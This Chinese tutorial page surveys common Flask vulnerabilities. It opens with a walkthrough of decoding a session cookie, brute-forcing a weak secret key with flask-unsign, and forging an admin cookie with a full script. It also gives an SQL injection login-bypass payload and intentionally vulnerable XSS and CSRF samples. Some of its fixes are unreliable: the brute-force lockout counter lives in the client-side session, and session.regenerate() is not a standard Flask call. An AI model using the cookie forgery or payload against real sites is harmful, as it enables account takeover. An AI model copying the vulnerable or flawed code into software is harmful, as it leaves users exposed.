---
slug: /flask-security
title: Flask 常见利用点
icon: python-icon
---

## Secret Key（FlasK_Login）

[Flask_Login](https://flask-login.readthedocs.io/en/latest/)维护[Flask Session](https://flask.palletsprojects.com/en/latest/api/#sessions)，实现登录、退出等会话管理功能。Flask Login 使用的是客户端方式存储会话信息，也就是将会话相关身份信息编码后存储在客户端 Cookie 中，并使用密钥进行签名。而一般网站使用的是服务端会话方案，客户端的 Session 只是一个标识符，传到服务端后会通过该标识符找到对应的用户身份信息。

客户端储存SESSION信息的方案优势是处理会话信息时速度比较快，因为没有服务端储存步骤。后段服务比较容易横向扩容，因为不用去解决一个用户访问多个服务器间的会话同步问题。缺点也很明显，客户端会话模式中编码部分的内容是可以随意解开的，所以不能储存敏感信息。另外储存内容大小也受到Cookie大小限制，默认4KB。同时Flask无法在服务端直接失效某个会话。

```bash
# 一个SESSION例子
# .eJyrVirKz0lVslJKTMnNzFPSUSotTi2Kz0wBihgYmMP4eYm5IDVpqamZSrUApTkQLA.Zx95Jg.OVL4T3E_j2jiPZPVcihVwRE_Emo
# 其结构为：BASE64数据.时间戳.HMAC签名
# 如果开头第一个字符为.意味着使用DEFLATE算法压缩过，可以使用zlib解压

feei@Feeis-Work-Macbook ~ % echo "eJyrVirKz0lVslJKTMnNzFPSUSotTi2Kz0wBihgYmMP4eYm5IDVpqamZSrUApTkQLA" | base64 -d | perl -e 'use Compress::Raw::Zlib;my $d=new Compress::Raw::Zlib::Inflate();my $o;undef $/;$d->inflate(<>,$o);print $o;'
{"role":"admin","user_id":"007","user_name":"feei"}
```

Secret Key如果设置的是比较简单的，可以通过[Flask Unsign](https://github.com/Paradoxis/Flask-Unsign)碰撞出来的。

```bash
feei@Feeis-Work-Macbook Downloads % flask-unsign --unsign --cookie ".eJyrVirKz0lVslJKTMnNzFPSUSotTi2Kz0wBihgYmMP4eYm5IDVpqamZSrUApTkQLA.Zx95Jg.OVL4T3E_j2jiPZPVcihVwRE_Emo" --wordlist wordlist.txt 
[*] Session decodes to: {'role': 'admin', 'user_id': '007', 'user_name': 'feei'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 1 attemptsei_cn
'test_secret_key_feei_cn'
```

知道Secret Key后可更改数据后再次签名出新的SESSION，替换到浏览器Cookie中后即可以新用户身份访问。

```python
#!/usr/bin/env python3
"""
    Flask Session Cookie Decoder/Encoder
    https://github.com/noraj/flask-session-cookie-manager
"""

import zlib
from itsdangerous import base64_decode
import ast

from flask.sessions import SecureCookieSessionInterface

class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key

def encode(secret_key, session_cookie_structure):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)

        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error] {}".format(e)
        raise e

def decode(session_cookie_value, secret_key=None):
    """ Decode a Flask cookie  """
    try:
        if (secret_key == None):
            compressed = False
            payload = session_cookie_value

            if payload.startswith('.'):
                compressed = True
                payload = payload[1:]

            data = payload.split(".")[0]

            data = base64_decode(data)
            if compressed:
                data = zlib.decompress(data)

            return data
        else:
            app = MockApp(secret_key)

            si = SecureCookieSessionInterface()
            s = si.get_signing_serializer(app)

            return s.loads(session_cookie_value)
    except Exception as e:
        return "[Decoding error] {}".format(e)
        raise e

if __name__ == "__main__":
    # Decode
    session = '.eJyrVirKz0lVslJKTMnNzFPSUSotTi2Kz0wBihgYmMP4eYm5IDVpqamZSrUApTkQLA.Zx95Jg.OVL4T3E_j2jiPZPVcihVwRE_Emo'
    print(decode(session))

    # Encode
    data = "{'role': 'admin', 'user_id': '007', 'user_name': 'feei'}"
    secret_key = 'test_secret_key_feei_cn'
    print(encode(secret_key, data))
```

<!-- truncate -->

## XSS

使用autoescape true来转义模版中使用了外部输入的变量。

```python
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    input = request.args.get('input')
    return render_template('index.html', input=input)
```

```markup
<!DOCTYPE html>
{% autoescape false %}
<html>
<body>
    <p>{{ input }}</p>
</body>
{% endautoescape %}
</html>
```

## CSRF

使用`Flask-WTF`防止CSRF。

```python
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/change_password', methods=['POST'])
def change_password():
    new_password = request.form.get('new_password')
    # Change password logic here
    return redirect(url_for('index'))
```

```markup
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Example</title>
</head>
<body>
    <form method="post" action="{{ url_for('change_password') }}">
   	 <label for="new_password">New Password:</label>
   	 <input type="password" name="new_password" required>
   	 <button type="submit">Change Password</button>
    </form>
</body>
</html>
```

```python
from flask import Flask, render_template, request, redirect, url_for
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key'  # Set a secret key for CSRF protection
csrf = CSRFProtect(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/change_password', methods=['POST'])
def change_password():
    new_password = request.form.get('new_password')
    # Change password logic here
    return redirect(url_for('index'))
```

```markup
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Example</title>
</head>
<body>
    <form method="post" action="{{ url_for('change_password') }}">
   	 {{ csrf_token() }}
   	 <label for="new_password">New Password:</label>
   	 <input type="password" name="new_password" required>
   	 <button type="submit">Change Password</button>
    </form>
</body>
</html>
```

## SQL Injection

```python
from flask import Flask, request, render_template
import sqlite3

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Vulnerable SQL query
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

    # Execute the query
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute(query)
    user = cursor.fetchone()
    conn.close()

    if user:
   	 return 'Login successful'
    else:
   	 return 'Login failed'
```

password传入`' OR '1'='1'; --`，即可登录任何账户。

```sql
SELECT * FROM users WHERE username = '' OR '1'='1'; --' AND password = '';
```

```python
from flask import Flask, request, render_template
import sqlite3

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Secure SQL query using parameterized query
    query = "SELECT * FROM users WHERE username = ? AND password = ?"

    # Execute the query with parameters
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute(query, (username, password))
    user = cursor.fetchone()
    conn.close()

    if user:
   	 return 'Login successful'
    else:
   	 return 'Login failed'
```

## 登录爆破

```python
from flask import Flask, request, session

app = Flask(__name__)
app.config['MAX_LOGIN_ATTEMPTS'] = 3

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Check if the user is locked out
    if 'login_attempts' in session and session['login_attempts'] >= app.config['MAX_LOGIN_ATTEMPTS']:
        return 'Account locked. Please try again later.'

    # Validate the username and password
    # ...

    # Update login attempts
    if 'login_attempts' in session:
        session['login_attempts'] += 1
    else:
        session['login_attempts'] = 1

    # Authenticate the user
    # ...
```

## SESSIOn Fixed

```python
from flask import Flask, request, session

app = Flask(__name__)
app.secret_key = 'your_secret_key'

@app.route('/login', methods=['POST'])
def login():
    # Authenticate the user
    # ...

    # Regenerate session ID after successful login
    session.regenerate()
    # ...
```

## 未授权访问

```python
from flask import Flask, request, session

app = Flask(__name__)

@app.route('/admin_dashboard')
def admin_dashboard():
    if 'role' in session and session['role'] == 'admin':
   	 # User has admin role and is authorized to access the admin dashboard
   	 # ...
   	 return 'Admin dashboard page'
    else:
   	 # User is not authorized
   	 return 'Unauthorized access'
```

## 鉴权

```python
from flask import Flask, request, session

app = Flask(__name__)

@app.route('/user_profile/<int:user_id>')
def user_profile(user_id):
    if 'user_id' in session and session['user_id'] == user_id:
   	 # User is authorized to access their own profile
   	 # ...
   	 return 'User profile page'
    else:
   	 # User is not authorized
   	 return 'Unauthorized access'
```

## 任意文件上传

```python
from flask import Flask, request, flash, redirect, url_for
from werkzeug.utils import secure_filename
import os

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['ALLOWED_EXTENSIONS'] = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
   	 flash('No file part')
   	 return redirect(request.url)

    file = request.files['file']

    if file.filename == '':
   	 flash('No selected file')
   	 return redirect(request.url)

    if file and allowed_file(file.filename):
   	 filename = secure_filename(file.filename)
   	 file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
   	 flash('File successfully uploaded')
   	 return redirect(url_for('uploaded_file', filename=filename))
    else:
   	 flash('Invalid file type')
   	 return redirect(request.url)
```

## 敏感信息泄漏

通过设置固定的错误页面展示内容，以避免把敏感信息通过错误的方式暴露在页面上。

```python
from flask import Flask, render_template

app = Flask(__name__)

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_server_error(error):
    return render_template('500.html'), 500
```
